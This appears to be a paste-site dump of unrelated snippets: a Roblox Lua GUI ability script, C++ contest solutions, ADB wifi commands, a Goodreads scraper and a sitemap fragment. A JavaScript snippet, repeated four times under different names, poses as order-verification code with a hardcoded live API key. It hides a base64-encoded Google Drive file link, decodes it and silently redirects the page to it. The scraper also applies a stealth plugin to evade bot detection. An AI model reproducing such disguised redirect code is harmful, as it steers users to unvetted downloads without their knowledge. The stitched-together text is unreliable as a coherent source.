G2L[""2""] = Instance.new(""Frame"", G2L[""1""]);
G2L[""2""][""BorderSizePixel""] = 0;
G2L[""2""][""BackgroundColor3""] = Color3.fromRGB(255, 255, 255);
G2L[""2""][""Size""] = UDim2.new(0, 652, 0, 110);
G2L[""2""][""Position""] = UDim2.new(0.33, 0, 0.78613, 0);
G2L[""2""][""BorderColor3""] = Color3.fromRGB(0, 0, 0);
G2L[""2""][""BackgroundTransparency""] = 1;


-- StarterGui.SeishiroNagi.Frame.TextButton
G2L[""3""] = Instance.new(""TextButton"", G2L[""2""]);
G2L[""3""][""TextWrapped""] = true;
G2L[""3""][""BorderSizePixel""] = 0;
G2L[""3""][""TextColor3""] = Color3.fromRGB(255, 255, 255);
G2L[""3""][""TextSize""] = 50;
G2L[""3""][""TextScaled""] = true;
G2L[""3""][""BackgroundColor3""] = Color3.fromRGB(114, 114, 114);
G2L[""3""][""FontFace""] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L[""3""][""Size""] = UDim2.new(0, 101, 0, 101);
G2L[""3""][""BorderColor3""] = Color3.fromRGB(0, 0, 0);
G2L[""3""][""Text""] = [[Trap]];
G2L[""3""][""Position""] = UDim2.new(0.38804, 0, 0, 0);


-- StarterGui.SeishiroNagi.Frame.TextButton.UICorner
G2L[""4""] = Instance.new(""UICorner"", G2L[""3""]);



-- StarterGui.SeishiroNagi.Frame.TextButton.aura
G2L[""5""] = Instance.new(""ParticleEmitter"", G2L[""3""]);
G2L[""5""][""LightInfluence""] = 1;
-- [ERROR] cannot convert Lifetime, please report to ""https://github.com/uniquadev/GuiToLuaConverter/issues""
G2L[""5""][""LightEmission""] = 0.5;
G2L[""5""][""Color""] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 255, 255)),ColorSequenceKeypoint.new(0.109, Color3.fromRGB(150, 0, 255)),ColorSequenceKeypoint.new(0.228, Color3.fromRGB(56, 0, 101)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(64, 0, 141))};
G2L[""5""][""ZOffset""] = -2;
-- [ERROR] cannot convert Speed, please report to ""https://github.com/uniquadev/GuiToLuaConverter/issues""
G2L[""5""][""Size""] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1.6253),NumberSequenceKeypoint.new(1.000, 0.66679)};
-- [ERROR] cannot convert RotSpeed, please report to ""https://github.com/uniquadev/GuiToLuaConverter/issues""
G2L[""5""][""Texture""] = [[http://www.roblox.com/asset/?id=5872447086]];
G2L[""5""][""Rate""] = 36;
G2L[""5""][""EmissionDirection""] = Enum.NormalId.Back;
G2L[""5""][""Name""] = [[aura]];


-- StarterGui.SeishiroNagi.Frame.TextButton.aura.fire particle
G2L[""6""] = Instance.new(""Decal"", G2L[""5""]);
G2L[""6""][""Name""] = [[fire particle]];
G2L[""6""][""Texture""] = [[http://www.roblox.com/asset/?id=5872447086]];


-- StarterGui.SeishiroNagi.Frame.TextButton.LocalScript
G2L[""7""] = Instance.new(""LocalScript"", G2L[""3""]);



-- StarterGui.SeishiroNagi.Frame.TextButton2
G2L[""8""] = Instance.new(""TextButton"", G2L[""2""]);
G2L[""8""][""TextWrapped""] = true;
G2L[""8""][""BorderSizePixel""] = 0;
G2L[""8""][""TextColor3""] = Color3.fromRGB(255, 255, 255);
G2L[""8""][""TextSize""] = 20;
G2L[""8""][""TextScaled""] = true;
G2L[""8""][""BackgroundColor3""] = Color3.fromRGB(114, 114, 114);
G2L[""8""][""FontFace""] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L[""8""][""Size""] = UDim2.new(0, 101, 0, 101);
G2L[""8""][""Name""] = [[TextButton2]];
G2L[""8""][""BorderColor3""] = Color3.fromRGB(0, 0, 0);
G2L[""8""][""Text""] = [[Genius dribbling]];
G2L[""8""][""Position""] = UDim2.new(0.188, 0, 0, 0);


-- StarterGui.SeishiroNagi.Frame.TextButton2.UICorner
G2L[""9""] = Instance.new(""UICorner"", G2L[""8""]);



-- StarterGui.SeishiroNagi.Frame.TextButton2.LocalScript
G2L[""a""] = Instance.new(""LocalScript"", G2L[""8""]);



-- StarterGui.SeishiroNagi.Frame.TextButton2.genis
G2L[""b""] = Instance.new(""RemoteEvent"", G2L[""8""]);
G2L[""b""][""Name""] = [[genis]];


-- StarterGui.SeishiroNagi.Frame.TextButton2.aura
G2L[""c""] = Instance.new(""ParticleEmitter"", G2L[""8""]);
G2L[""c""][""LightInfluence""] = 1;
-- [ERROR] cannot convert Lifetime, please report to ""https://github.com/uniquadev/GuiToLuaConverter/issues""
G2L[""c""][""LightEmission""] = 0.5;
G2L[""c""][""Color""] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 255, 255)),ColorSequenceKeypoint.new(0.109, Color3.fromRGB(150, 0, 255)),ColorSequenceKeypoint.new(0.228, Color3.fromRGB(56, 0, 101)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(64, 0, 141))};
G2L[""c""][""ZOffset""] = -2;
-- [ERROR] cannot convert Speed, please report to ""https://github.com/uniquadev/GuiToLuaConverter/issues""
G2L[""c""][""Size""] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1.6253),NumberSequenceKeypoint.new(1.000, 0.66679)};
-- [ERROR] cannot convert RotSpeed, please report to ""https://github.com/uniquadev/GuiToLuaConverter/issues""
G2L[""c""][""Texture""] = [[http://www.roblox.com/asset/?id=5872447086]];
G2L[""c""][""Rate""] = 36;
G2L[""c""][""EmissionDirection""] = Enum.NormalId.Back;
G2L[""c""][""Name""] = [[aura]];


-- StarterGui.SeishiroNagi.Frame.TextButton2.aura.fire particle
G2L[""d""] = Instance.new(""Decal"", G2L[""c""]);
G2L[""d""][""Name""] = [[fire particle]];
G2L[""d""][""Texture""] = [[http://www.roblox.com/asset/?id=5872447086]];


-- StarterGui.SeishiroNagi.Frame.TextButton3
G2L[""e""] = Instance.new(""TextButton"", G2L[""2""]);
G2L[""e""][""TextWrapped""] = true;
G2L[""e""][""BorderSizePixel""] = 0;
G2L[""e""][""TextColor3""] = Color3.fromRGB(255, 255, 255);
G2L[""e""][""TextSize""] = 50;
G2L[""e""][""TextScaled""] = true;
G2L[""e""][""BackgroundColor3""] = Color3.fromRGB(114, 114, 114);
G2L[""e""][""FontFace""] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L[""e""][""Size""] = UDim2.new(0, 101, 0, 101);
G2L[""e""][""Name""] = [[TextButton3]];
G2L[""e""][""BorderColor3""] = Color3.fromRGB(0, 0, 0);
G2L[""e""][""Text""] = [[Genius's Leap]];
G2L[""e""][""Position""] = UDim2.new(0.588, 0, 0, 0);


-- StarterGui.SeishiroNagi.Frame.TextButton3.UICorner
G2L[""f""] = Instance.new(""UICorner"", G2L[""e""]);



-- StarterGui.SeishiroNagi.Frame.TextButton3.LocalScript
G2L[""10""] = Instance.new(""LocalScript"", G2L[""e""]);



-- StarterGui.SeishiroNagi.Frame.TextButton3.GeniusLeap
G2L[""11""] = Instance.new(""RemoteEvent"", G2L[""e""]);
G2L[""11""][""Name""] = [[GeniusLeap]];


-- StarterGui.SeishiroNagi.Frame.TextButton3.aura
G2L[""12""] = Instance.new(""ParticleEmitter"", G2L[""e""]);
G2L[""12""][""LightInfluence""] = 1;
-- [ERROR] cannot convert Lifetime, please report to ""https://github.com/uniquadev/GuiToLuaConverter/issues""
G2L[""12""][""LightEmission""] = 0.5;
G2L[""12""][""Color""] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 255, 255)),ColorSequenceKeypoint.new(0.109, Color3.fromRGB(150, 0, 255)),ColorSequenceKeypoint.new(0.228, Color3.fromRGB(56, 0, 101)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(64, 0, 141))};
G2L[""12""][""ZOffset""] = -2;
-- [ERROR] cannot convert Speed, please report to ""https://github.com/uniquadev/GuiToLuaConverter/issues""
G2L[""12""][""Size""] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1.6253),NumberSequenceKeypoint.new(1.000, 0.66679)};
-- [ERROR] cannot convert RotSpeed, please report to ""https://github.com/uniquadev/GuiToLuaConverter/issues""
G2L[""12""][""Texture""] = [[http://www.roblox.com/asset/?id=5872447086]];
G2L[""12""][""Rate""] = 36;
G2L[""12""][""EmissionDirection""] = Enum.NormalId.Back;
G2L[""12""][""Name""] = [[aura]];


-- StarterGui.SeishiroNagi.Frame.TextButton3.aura.fire particle
G2L[""13""] = Instance.new(""Decal"", G2L[""12""]);
G2L[""13""][""Name""] = [[fire particle]];
G2L[""13""][""Texture""] = [[http://www.roblox.com/asset/?id=5872447086]];


-- StarterGui.SeishiroNagi.ByFFedya
G2L[""14""] = Instance.new(""TextLabel"", G2L[""1""]);
G2L[""14""][""TextWrapped""] = true;
G2L[""14""][""BorderSizePixel""] = 0;
G2L[""14""][""TextSize""] = 14;
G2L[""14""][""TextTransparency""] = 0.82;
G2L[""14""][""TextStrokeColor3""] = Color3.fromRGB(255, 255, 255);
G2L[""14""][""TextScaled""] = true;
G2L[""14""][""BackgroundColor3""] = Color3.fromRGB(255, 255, 255);
G2L[""14""][""FontFace""] = Font.new([[rbxasset://fonts/families/IndieFlower.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L[""14""][""TextColor3""] = Color3.fromRGB(0, 0, 0);
G2L[""14""][""BackgroundTransparency""] = 1;
G2L[""14""][""RichText""] = true;
G2L[""14""][""Size""] = UDim2.new(0, 200, 0, 50);
G2L[""14""][""BorderColor3""] = Color3.fromRGB(255, 255, 255);
G2L[""14""][""Text""] = [[Creator: FFedya]];
G2L[""14""][""Name""] = [[ByFFedya]];
G2L[""14""][""Position""] = UDim2.new(0.43626, 0, 0.01741, 0);


-- StarterGui.SeishiroNagi.Frame.TextButton.LocalScript
local function C_7()
local script = G2L[""7""];
	local text = script.Parent.Text
	local UIS = game:GetService(""UserInputService"")
	local CAS = game:GetService(""ContextActionService"")
	local tweenService = game:GetService(""TweenService"")
	local nah = 0
	local speed2 = 0
	local function trap(player)
		speed2 = 1
		local aura = script.Parent.aura
		local humanoid = player.Character:FindFirstChild(""Humanoid"")
		local humanoidrootpart = player.Character:FindFirstChild(""HumanoidRootPart"")
		local goal = {Size = Vector3.new(0.001, 20, 0.001)}
		local goal2 = {Size = Vector3.new(2.9000000953674316, 2.9000000953674316, 1.4500000476837158)}
		local tweenInfo = TweenInfo.new(0.7, Enum.EasingStyle.Linear)
		local tweenInfo2 = TweenInfo.new(0.4, Enum.EasingStyle.Linear)
		local copyaura = aura:Clone()
		copyaura.Parent = player.Character.UpperTorso
		local tween = tweenService:Create(humanoidrootpart, tweenInfo, goal)
		local tween2 = tweenService:Create(humanoidrootpart, tweenInfo2, goal2)
		humanoid.WalkSpeed = 65
		tween:Play()
		humanoid.WalkSpeed = 65
		wait(0.65)
		humanoid.WalkSpeed = 65
		tween2:Play()
		wait(0.5)
		copyaura:Destroy()
		speed2 = 0
		humanoid.WalkSpeed = 25
	end
	
	UIS.InputBegan:Connect(function(input)
		if nah == 0 then
			if input.KeyCode == Enum.KeyCode.Z then
				nah = 1
				local player = script.Parent.Parent.Parent.Parent.Parent
				trap(player)
				for cooldown = 10, 0, -1 do
					script.Parent.Text = cooldown
					wait(1)
				end
				script.Parent.Text = ""Trap""
				wait(0)
				nah = 0
			end
		end
	end)
	while true do
		wait(0.01)
		if speed2 == 1 then
			local player = script.Parent.Parent.Parent.Parent.Parent
			local humanoid = player.Character:FindFirstChild(""Humanoid"")
			humanoid.WalkSpeed = 50
		elseif speed2 == 0 then
		end
	end
end;
task.spawn(C_7);
-- StarterGui.SeishiroNagi.Frame.TextButton2.LocalScript
local function C_a()
local script = G2L[""a""];
	local text = script.Parent.Text
	local UIS = game:GetService(""UserInputService"")
	local CAS = game:GetService(""ContextActionService"")
	local tweenService = game:GetService(""TweenService"")
	local nah = 0
	local speed = 0
	local function trap(player)
		local aura = script.Parent.aura
		local humanoid = player.Character:FindFirstChild(""Humanoid"")
		local anim = Instance.new(""Animation"")
		anim.AnimationId = ""http://www.roblox.com/asset/?id=10214311282""
	
		anim.Parent = script
	
		print(""Attempting to load animation with ID:"", anim.AnimationId)
		local animator = humanoid:WaitForChild(""Animator"")
		local animp = humanoid.Animator:LoadAnimation(anim)
		animp.Priority = Enum.AnimationPriority.Action4
	
		if not animp then
			print(""Failed to load animation."")
			return
		end 
		humanoid.WalkSpeed = 45
		animp.Looped = true
		animp:Play()
		speed = 1
		wait(0.6)
		local copyaura = aura:Clone()
		copyaura.Parent = player.Character.UpperTorso
		wait(3.87)
		animp:Stop()
		humanoid.WalkSpeed = 25
		copyaura:Destroy()
		speed = 0
	end
	UIS.InputBegan:Connect(function(input)
		if nah == 0 then
		if input.KeyCode == Enum.KeyCode.X then
			nah = 1
			local player = script.Parent.Parent.Parent.Parent.Parent
			trap(player)
			for cooldown = 7, 0, -1 do
				script.Parent.Text = cooldown
				wait(1)
			end
			script.Parent.Text = ""Genius dribbling""
			wait(0)
			nah = 0
		end
		end
	end)
	while true do
		wait(0.01)
		if speed == 1 then
			local player = script.Parent.Parent.Parent.Parent.Parent
			local humanoid = player.Character:FindFirstChild(""Humanoid"")
			humanoid.WalkSpeed = 45
		elseif speed == 0 then
		end
	end
	
	
end;
task.spawn(C_a);
-- StarterGui.SeishiroNagi.Frame.TextButton3.LocalScript
local function C_10()
local script = G2L[""10""];
	local text = script.Parent.Text
	local UIS = game:GetService(""UserInputService"")
	local CAS = game:GetService(""ContextActionService"")
	local tweenService = game:GetService(""TweenService"")
	local nah = 0
	local speed1 = 0
	local function trap(player)
		local aura = script.Parent.aura
		local humanoid = player.Character:FindFirstChild(""Humanoid"")
		local anim = Instance.new(""Animation"")
		anim.AnimationId = ""http://www.roblox.com/asset/?id=10921157929""
		anim.Parent = script
	
		print(""Attempting to load animation with ID:"", anim.AnimationId)
		local animator = humanoid:WaitForChild(""Animator"")
		local animp = humanoid.Animator:LoadAnimation(anim)
		animp.Priority = Enum.AnimationPriority.Action4
	
		if not animp then
			print(""Failed to load animation."")
			return
		end
		speed1 = 1
		animp.Looped = true
		animp:Play()
		wait(0.4)
		local copyaura = aura:Clone()
		copyaura.Parent = player.Character.UpperTorso
		wait(0.9)
		humanoid.WalkSpeed = 25
		animp:stop()
		copyaura:Destroy()
		speed1 = 0
	end
	
	UIS.InputBegan:Connect(function(input)
		if nah == 0 then
			if input.KeyCode == Enum.KeyCode.B then
				nah = 1
				local player = script.Parent.Parent.Parent.Parent.Parent
				trap(player)
				for cooldown = 10, 0, -1 do
					script.Parent.Text = cooldown
					wait(1)
				end
				script.Parent.Text = ""Genius's Leap""
				wait(0)
				nah = 0
			end
		end
	end)
	while true do
		wait(0.01)
		if speed1 == 1 then
			local player = script.Parent.Parent.Parent.Parent.Parent
			local humanoid = player.Character:FindFirstChild(""Humanoid"")
			humanoid.WalkSpeed = 45
		elseif speed1 == 0 then
		end
	end
end;
task.spawn(C_10);

return G2L[""1""], require;"
abNUaRSM,Market.js,SpawnKz,JavaScript,Tuesday 8th of April 2025 09:49:44 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/90786/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
LuAx1aHB,Untitled,AlexAvram,C++,Tuesday 8th of April 2025 09:44:55 AM CDT,"//submatrix #1441
#include <iostream>
#include <fstream>
#include <cmath>

using namespace std;
string fisier=""submatrix"";
ifstream fin(fisier+"".in"");
ofstream fout(fisier+"".out"");

int n, dp[1001][1001];
bool mat[1001][1001];
/*
problema clasica
//
imi bordez initial matricea cu elementele
de pe prima linia si prima coloana; verificarile
pe aceste pozitii ar fi inutile;
//
pentru fiecare alt element, verific care este lungimea
laturii celui mai mic patrat din care fac parte elementele din
""spatele lui""; fie minimul dintre lungime laturilor  verifcatex,
acest fapt ne garanteaza garanteaza pentru elementul curent
o lungime x+1;
     |element de verificat element de verificat|
     |element de verificat    element curent   |
//
la final pe pozitia (i, j) a matricei dp[][] v-a fi memorata
lungimea maxima a laturii patratului ce contine elemenutul (i, j),
luand in calcul strict elementele din submatricea (0,0)-(i,j)
//
parcurg matricea si afisez cea mai mare valoare gasita;
*/
void citire()
{
    fin>>n;
    for (int i=1; i<=n; ++i)
        for (int j=1; j<=n; ++j)
            fin>>mat[i][j];
}
void construire_margini()
{
    for (int i=1; i<=n; ++i)
    {
        dp[i][1]=mat[i][1];
        dp[1][i]=mat[1][i];
    }
}
void rezolvare()
{
    construire_margini();
    int rezultat=0;
    for (int i=2; i<=n; ++i)
    {
        for (int j=2; j<=n; ++j)
        {
            if (mat[i][j])
            {
                dp[i][j]=min(dp[i-1][j], min(dp[i-1][j-1], dp[i][j-1]))+1;
                if (dp[i][j]>rezultat)
                    rezultat=dp[i][j];
            }
            else
                dp[i][j]=0;
        }
    }
    fout<<rezultat<<'\n';
}
int main()
{
    citire();
    rezolvare();
    return 0;
}
"
Pp3s82hF,Untitled,SpawnKz,JavaScript,Tuesday 8th of April 2025 09:34:20 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/34236/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
rMJeHACx,Android ADB network settings using CMD,metalx1000,Bash,Tuesday 8th of April 2025 09:29:43 AM CDT,"#Android ADB network settings using CMD
#current wifi status
cmd -w wifi status

#enable and disable wifi
cmd -w wifi set-wifi-enabled enabled
cmd -w wifi set-wifi-enabled disabled


#list all options
cmd -w wifi

# start scan
cmd -w wifi start-scan

# list scan results
cmd -w wifi list-scan-results

# alias to get ip address
alias ip='cmd -w wifi status|sed ""s/IP: \//\nIP: /g""|grep ""^IP""|awk ""{print \$2}""|tr -d "",""'

"
0YNzqi2d,goodreads scrape,STANAANDREY,Python,Tuesday 8th of April 2025 09:21:39 AM CDT,"import asyncio, nest_asyncio, re, pandas as pd
from playwright.async_api import async_playwright
from playwright_stealth import stealth_async

# Allow nested event loops (useful in Jupyter or interactive environments)
nest_asyncio.apply()

dfs = []
WITH_DESC_PER_PG = 10

async def get_row_data(row, browser, should_get_desc):
    # Extract the book title
    book_title_element = await row.query_selector(""a.bookTitle span"")
    book_title = await book_title_element.inner_text() if book_title_element else ""N/A""

    # Extract the author name
    author_element = await row.query_selector(""div.authorName__container a.authorName span[itemprop='name']"")
    author_name = await author_element.inner_text() if author_element else ""N/A""

    # Extract the average rating
    rating_element = await row.query_selector(""span.minirating"")
    avg_rating = ""N/A""
    if rating_element:
        rating_text = await rating_element.inner_text()
        # Use regex to extract the rating (e.g., ""4.34 avg rating"")
        rating_match = re.search(r""(\d\.\d{2,3}) avg rating"", rating_text)
        avg_rating = float(rating_match.group(1)) if rating_match else ""N/A""

    # Extract the score
    score_element = await row.query_selector(""a"")  # Select all <a> elements
    score = ""N/A""
    if score_element:
        # Iterate through all <a> elements to find the one containing ""score:""
        all_links = await row.query_selector_all(""a"")
        for link in all_links:
            link_text = await link.inner_text()
            if ""score:"" in link_text.lower():
                # Use regex to extract the numeric score
                score_match = re.search(r""score:\s*([\d,]+)"", link_text, re.IGNORECASE)
                if score_match:
                    score = int(score_match.group(1).replace("","", """"))
                    break

    # Extract the description
    description = ""N/A""
    book_link_element = await row.query_selector(""a.bookTitle"")
    if should_get_desc and book_link_element:
        # Get the href attribute of the book link
        book_link = await book_link_element.get_attribute(""href"")
        if book_link:
            # Open a new page for the book details
            full_book_link = f""https://www.goodreads.com{book_link}""
            print(f""Opening new page for: {full_book_link}"")
            new_page = await browser.new_page()
            await new_page.goto(full_book_link, timeout=60000)

            # Wait for the description to load
            await asyncio.sleep(2)  # Add a 2-second delay
            desc_sel = 'div.DetailsLayoutRightParagraph__widthConstrained span.Formatted'
            await new_page.wait_for_selector(desc_sel, timeout=60000)

            # Extract the description
            description_element = await new_page.query_selector(desc_sel)
            if description_element:
                description = await description_element.inner_text()

            # Close the new page
            await new_page.close()

    return {
        'title': book_title,
        'author': author_name,
        'avg_rating': avg_rating,
        'score': score,
        'description': description
    }


async def search_goodreads_best(page_qparam: int):
    pw = None
    browser = None
    try:
        print(""Launching Playwright..."")
        pw = await async_playwright().start()

        # Launch the browser in headless mode
        browser = await pw.chromium.launch(headless=True)
        print(""Browser launched."")

        # Create a new browser context with a custom User-Agent
        context = await browser.new_context(
            user_agent=""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36""
        )

        # Create a new page in the context
        page = await context.new_page()

        # Apply stealth to bypass bot detection
        await stealth_async(page)

        print(""Navigating to Goodreads website..."")
        url = 'https://www.goodreads.com/list/show/1.Best_Books_Ever'
        url_with_page_param = f'{url}?page={page_qparam}'

        # Navigate to the page
        await page.goto(url_with_page_param, timeout=60000)

        # Wait for the book list to load
        print(""Page loaded and content rendered."")

        # Get the full HTML content AFTER JavaScript execution
        table_selector = 'table.tableList'
        table_element = await page.query_selector(table_selector)
        rows = await table_element.query_selector_all(""tr"")
        rows_data = []
        for i, row in enumerate(rows):
            print(f'Processing book {i + 1}...')
            should_get_desc = bool(i < WITH_DESC_PER_PG)
            data_row = await get_row_data(row, browser, should_get_desc)
            data_row['rank'] = i + 1
            rows_data.append(data_row)
            #break

        # Convert the data to a Pandas DataFrame
        df = pd.DataFrame(rows_data)
        dfs.append(df)

    except Exception as e:
        print(f""An error occurred: {e}"")
    finally:
        # Close the browser and stop Playwright
        if browser:
            await browser.close()
            print(""Browser closed."")
        if pw:
            await pw.stop()
            print(""Playwright stopped."")

# Run the async function
for i in range(1, 4):
  print(f'Processing page {i}...')
  asyncio.run(search_goodreads_best(i))
  print('---------------------------------------------------------\n')

dfs = pd.concat(dfs).reset_index(drop=True)
display(dfs.head(10))
# Display the book with the highest average rating
highest_avg_rating_book = dfs.loc[dfs['avg_rating'].idxmax()]
print(""\nBook with the Highest Average Rating:"")
print(f""  Title: {highest_avg_rating_book['title']}"")
print(f""  Author: {highest_avg_rating_book['author']}"")
print(f""  Avg Rating: {highest_avg_rating_book['avg_rating']}"")
print(f""  Description: {highest_avg_rating_book['description'][:50]}..."")

# Display the book with the highest score
highest_score_book = dfs.loc[dfs['score'].idxmax()]
print(""\nBook with the Highest Score:"")
print(f""  Title: {highest_score_book['title']}"")
print(f""  Author: {highest_score_book['author']}"")
print(f""  Score: {highest_score_book['score']}"")
print(f""  Description: {highest_score_book['description'][:50]}..."")

# Check if they are the same book
if highest_avg_rating_book['title'] == highest_score_book['title']:
    print(""\nThey are the same book!"")
else:
    print(""\nThey are not the same book!"")"
F8i2WGXX,Products.js,dentira,JavaScript,Tuesday 8th of April 2025 09:18:13 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/39783/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
gW48rkhD,Untitled,Flarlkk,C#,Tuesday 8th of April 2025 09:10:51 AM CDT,"Teste Raid
Code by Fla Exploit
@everyone"
iWqs3Tuk,Untitled,AlexAvram,C++,Tuesday 8th of April 2025 09:05:38 AM CDT,"//birocratie2 #4611
#include <iostream>
#include <fstream>
#include <cmath>

using namespace std;
string fisier=""birocratie"";
ifstream fin(fisier+"".in"");
ofstream fout(fisier+"".out"");

#define MINIM -1e9
#define Nmax 1001

int n, mat[Nmax][Nmax];
int dp[Nmax][Nmax];
/*
programare dinamica pe diagonale;
//
parcurgem pe rand toate diagonalele paralele cu cea secundara,
de sus in jos iar apoi de jos in sus; parcurgea in ambele directii
este pentru a verifica ca toate costurile sunt calculate optim,
fara sa conteze ordinea in care procesam elemente;
in cazul fiecarui element, vedem daca putem ajunge la el
prin una dintre celelalte 2 variante posibile de deplasare
(in jos sau la dreapta);
daca exista, alegem calea de castig maxim si o adunam elementului
curent;
*/
void citire()
{
    fin>>n;
    for (int i=1; i<=n; ++i)
        for (int j=1; j<=n; ++j)
            fin>>mat[i][j];
}
bool sunt_in_matrice(int i, int j)
{
    return i>=1 && i<=n && j>=1 && j<=n;
}
void rezolvare()
{
    dp[1][1]=mat[1][1];
    for(int diag=2; diag<=2*n-1; ++diag)
    {
        int suma=MINIM;
        for(int i=1; i<=n; ++i)
        {
            int j=diag-i+1;
            if(sunt_in_matrice(i,j))
            {
                if(sunt_in_matrice(i-1,j))
                {
                    suma=max(suma,dp[i-1][j]);
                }
                if(sunt_in_matrice(i,j-1))
                {
                    suma=max(suma,dp[i][j-1]);
                }
                dp[i][j]=suma+mat[i][j];
                suma+=mat[i][j];
            }
        }
        suma=MINIM;
        for(int i=n; i>=1; --i)
        {
            int j=diag-i+1;
            if(sunt_in_matrice(i,j))
            {
                if(sunt_in_matrice(i-1,j))
                {
                    suma=max(suma,dp[i-1][j]);
                }
                if(sunt_in_matrice(i,j-1))
                {
                    suma=max(suma,dp[i][j-1]);
                }
                dp[i][j]=max(dp[i][j],suma+mat[i][j]);
                //vedem daca obtinem o imbunatatire fata
                //de prima parcurgere
                suma+=mat[i][j];
            }
        }
    }
    fout<<dp[n][n];
}
int main()
{
    citire();
    rezolvare();
    return 0;
}
"
9QJatztA,Order.js,dentira,JavaScript,Tuesday 8th of April 2025 09:02:08 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/89291/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
SPSMtC4X,sitemap.xml glow hair trend,Iansukses,XML,Tuesday 8th of April 2025 08:46:58 AM CDT,"<urlset xmlns=""http://www.sitemaps.org/schemas/sitemap/0.9"">
<url>
<loc>https://glowhairtrend.blogspot.com/2025/04/need-to-see-new-and-la-mode-in-2025.html</loc>
</url>
<url>
